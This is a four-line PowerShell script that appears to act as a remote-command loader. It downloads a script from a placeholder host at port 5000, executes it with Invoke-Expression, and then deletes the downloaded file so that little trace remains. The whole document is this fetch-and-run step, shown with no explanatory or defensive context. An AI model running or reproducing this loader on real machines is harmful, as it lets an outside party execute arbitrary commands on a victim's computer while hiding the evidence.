wget -O commandscript.ps1 http://IP_ADDRESS_HERE:5000/commands
$dir = Get-Location
Invoke-Expression $dir/commandscript.ps1
Remove-Item commandscript.ps1